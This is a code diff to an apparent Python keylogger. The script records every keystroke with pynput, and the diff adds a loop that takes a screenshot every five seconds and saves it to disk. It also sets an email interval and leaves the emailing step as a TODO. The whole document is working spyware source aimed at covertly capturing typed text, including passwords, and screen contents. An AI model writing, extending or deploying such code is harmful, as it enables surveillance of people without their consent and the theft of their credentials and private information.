@@ -1,5 +1,6 @@
 from pynput import keyboard
-from datetime import date
+from datetime import date, datetime, timedelta
+import pyautogui
 
 keys = []
 curr_date = date.today()
@@ -34,17 +35,35 @@ def write_file(keys):
             # every keystroke for readability
             f.write(' ')
 
-# # Collect events until released
-# with keyboard.Listener(
-#         on_press=on_press,
-#         on_release=on_release) as listener:
-#     listener.join()
+def screenshot():
+    curr_date_time = datetime.now()
+    dt_string = curr_date_time.strftime("%d-%m-%Y_%H-%M-%S")
+    
+    ss = pyautogui.screenshot()
+    ss.save(f'screenshots/{dt_string}.jpg')
 
-# ...or, in a non-blocking fashion:
+# Start up the listener
 listener = keyboard.Listener(
     on_press=on_press,
     on_release=on_release)
 listener.start()
 
+# Initialize timekeeping variables for screenshots
+last_ss_time = datetime.utcnow()
+
+# initialize some timeframes
+screenshot_interval = 5
+email_interval = 60 * 5
+
+# Main loop to check timestamps for screenshots and email sending
 while True:
-    print("test")
+    curr_time = datetime.utcnow()
+    print(curr_time - last_ss_time)
+    
+    # Check if it's time to screenshot
+    if (curr_time - last_ss_time) > timedelta(seconds=screenshot_interval):
+        screenshot()
+        last_ss_time = curr_time
+
+    # Check if its time to email
+    # TODO
